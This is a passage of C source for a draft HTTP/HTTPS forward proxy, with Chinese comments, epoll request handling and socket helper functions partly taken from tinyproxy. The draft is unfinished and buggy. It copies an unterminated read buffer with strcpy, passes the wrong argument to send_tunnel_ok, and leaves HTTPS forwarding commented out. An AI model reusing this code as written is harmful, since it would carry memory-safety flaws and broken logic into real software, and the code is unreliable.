                ev.events = EPOLLIN | EPOLLET;
                ev.data.fd = connfd;
                epoll_ctl(epfd, EPOLL_CTL_ADD, connfd, &ev);
            }
            else
            {

                // 处理客户端请求
                char request[BUFSIZE], response[BUFSIZE];
                // 读取客户端请求体
                read(connfd, recvbuf, BUFSIZE);             
                strcpy(sendbuf, recvbuf);
                // 在HTTPS代理过程中，数据包传输过程中会发生以下变化：
                char *conn = cutstr(recvbuf, 0, 8);
                char *conntmp = "CONNECT";
                remove_spaces(conn);
                timeclose(connfd);
                // 判断connect
                if (strcmp(conn, conntmp) == 0)
                {
                    char *host = extract_host(recvbuf, sizeof(recvbuf));
                    if (host == NULL)
                    {
                        d("没匹配到目标");
                        close(connfd);
                        break;
                    }
                    // char destdomain[100], destip[20], destport[10];
                    char **ret;
                    char *destdomain, *destip, *destport;
                    ret = split_string(host, ":");
                    destdomain = ret[0];
                    destport = ret[1];
                    destip = domain_to_ip(destdomain);
                    d("https请求-------------------------------");
                    d(destdomain);
                    d(destport);
                    send_tunnel_ok(socket);
                    // char *response = forwardSslNoDecode(connfd, destip, atoi(destport), sendbuf);
                    break;
                }
                else
                {
                    // HTTP请求处理
                    char *host = extract_host(recvbuf, sizeof(recvbuf));
                    if (host == NULL)
                    {
                        d("没匹配到目标");
                        close(connfd);
                        break;
                    }
                    // char destdomain[100], destip[20], destport[10];
                    char **ret;
                    char *destdomain, *destip, *destport;
                    ret = split_string(host, ":");
                    destdomain = ret[0];
                    destport = ret[1];
                    d("http请求-------------------------------");
                    d(destdomain);
                    d(destport);                  
                    destip = domain_to_ip(destdomain);
                    // printf("请求信息: %s %s HTTP/%s\n", method, uri, http_version);
                    // 将请求转发给目标服务器
                    // TODO: 实现将请求转发给目标服务器的逻辑
                    char *response = forward(connfd, destip, atoi(destport), sendbuf);

                    // // 读取目标服务器的响应
                    // // printf("等待目标服务器信息...\n");
                    // // char *response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Hello, Worldddd[[[[!</h1>";
                    // // TODO: 替换成从目标服务器接收到的实际响应
                    // // 将响应返回给客户端
                    // // printf("Sending response to client...\n");
                    // send(connfd, response, strlen(response), 0);
                    close(connfd);
                    break; // 代理逻辑完成后，退出循环并关闭连接
                }

                // 关闭客户端连接
            }
        }
    }

    // 关闭套接字
    // close(listenfd);

    return 0;
}



/*
*创建目录
 */
int
sys_mkpath(const char *path, mode_t mode)
{
	char parent[strlen(path)+1];
	char *p;

	memcpy(parent, path, sizeof(parent));

	p = parent;
	do {
		/* skip leading '/' characters */
		while (*p == '/') p++;
		p = strchr(p, '/');
		if (p) {
			/* overwrite '/' to terminate the string at the next
			 * parent directory */
			*p = '\0';
		}

		struct stat sbuf;
		if (stat(parent, &sbuf) == -1) {
			if (errno == ENOENT) {
				if (mkdir(parent, mode) != 0)
					return -1;
			} else {
				return -1;
			}
		} else if (!S_ISDIR(sbuf.st_mode)) {
			errno = ENOTDIR;
			return -1;
		}

		if (p) {
			/* replace the overwritten slash */
			*p = '/';
			p++;
		}
	} while (p);

	return 0;
}


// //后台守护进程
// void makedaemon (void)
// {
//         if (fork () != 0)
//                 exit (0);

//         setsid ();
//         set_signal_handler (SIGHUP, SIG_IGN);

//         if (fork () != 0)
//                 exit (0);

// 	if (chdir ("/") != 0) {
//                 log_message (LOG_WARNING,
//                              "Could not change directory to /");
// 	}

//         umask (0177);


// }
// typedef void signal_func (int);
// /*
//  * Pass a signal number and a signal handling function into this function
//  * to handle signals sent to the process.
//  */
// signal_func *set_signal_handler (int signo, signal_func * func)
// {
//         struct sigaction act, oact;

//         act.sa_handler = func;
//         sigemptyset (&act.sa_mask);
//         act.sa_flags = 0;
// //         if (signo == SIGALRM) {
// // #ifdef SA_INTERRUPT
// //                 act.sa_flags |= SA_INTERRUPT;   /* SunOS 4.x */
// // #endif
// //         } else {
// // #ifdef SA_RESTART
// //                 act.sa_flags |= SA_RESTART;     /* SVR4, 4.4BSD */
// // #endif
// //         }
//         if (sigaction (signo, &act, &oact) < 0)
//                 return SIG_ERR;

//         return oact.sa_handler;
// }
/*
 * Set the socket to non blocking -rjkaes
 */
int socket_nonblocking (int sock)
{
        int flags;

        // assert (sock >= 0);

        flags = fcntl (sock, F_GETFL, 0);
        return fcntl (sock, F_SETFL, flags | O_NONBLOCK);
}

/*
 * Set the socket to blocking -rjkaes
 */
int socket_blocking (int sock)
{
        int flags;

        // assert (sock >= 0);

        flags = fcntl (sock, F_GETFL, 0);
        return fcntl (sock, F_SETFL, flags & ~O_NONBLOCK);
}
/*
 * Matched pair for safe_write(). If an EINTR occurs, pick up and try
 * again.
 */
ssize_t safe_read (int fd, char *buffer, size_t count)
{
        ssize_t len;

        do {
                len = read (fd, buffer, count);
        } while (len < 0 && errno == EINTR);

        return len;
}
/*
 * Write the buffer to the socket. If an EINTR occurs, pick up and try
 * again. Keep sending until the buffer has been sent.
 */
ssize_t safe_write (int fd, const char *buffer, size_t count)
{
        ssize_t len;
        size_t bytestosend;

        // assert (fd >= 0);
        // assert (buffer != NULL);
        // assert (count > 0);

        bytestosend = count;

        while (1) {
                len = send (fd, buffer, bytestosend, MSG_NOSIGNAL);

                if (len < 0) {
                        if (errno == EINTR)
                                continue;
                        else
                                return -errno;
                }

                if ((size_t) len == bytestosend)
                        break;

                buffer += len;
                bytestosend -= len;
        }

        return count;
}
/*
 * Send a "message" to the file descriptor provided. This handles the
 * differences between the various implementations of vsnprintf. This code
 * was basically stolen from the snprintf() man page of Debian Linux
 * (although I did fix a memory leak. :)
 */
int write_message (int fd, const char *fmt, ...)
{
        ssize_t n;
        size_t size = (1024 * 8);       /* start with 8 KB and go from there */
        char *buf, *tmpbuf;
        va_list ap;

        if ((buf = (char *) malloc (size)) == NULL)
                return -1;

        while (1) {
                va_start (ap, fmt);
                n = vsnprintf (buf, size, fmt, ap);
                va_end (ap);

                /* If that worked, break out so we can send the buffer */
                if (n > -1 && (size_t) n < size)
                        break;

                /* Else, try again with more space */
                if (n > -1)
                        /* precisely what is needed (glibc2.1) */
                        size = n + 1;
                else
                        /* twice the old size (glibc2.0) */
                        size *= 2;

                if ((tmpbuf = (char *) realloc (buf, size)) == NULL) {
                        free (buf);
                        return -1;
                } else
                        buf = tmpbuf;
        }

        if (safe_write (fd, buf, n) < 0) {
                free (buf);
                return -1;
        }

        free (buf);
        return 0;
}
/*
 * Send the appropriate response to the client to establish a SSL
 * connection.
 * tsl握手消息
 */
 int send_ssl_response (int sockfd)
{
        return write_message (sockfd,
                              "%s\r\n"
                              "%s\r\n"
                              "\r\n", SSL_CONNECTION_RESPONSE, PROXY_AGENT);
}

/* 响应隧道连接请求  */
int send_tunnel_ok(int client_sock)
{
    char * resp = "HTTP/1.1 200 Connection Established\r\n\r\n";
    int len = strlen(resp);
    char buffer[len+1];
    strcpy(buffer,resp);
    if(send_data(client_sock,buffer,len) < 0)
    {
        perror("Send http tunnel response  failed\n");
        return -1;
    }
    return 0;
}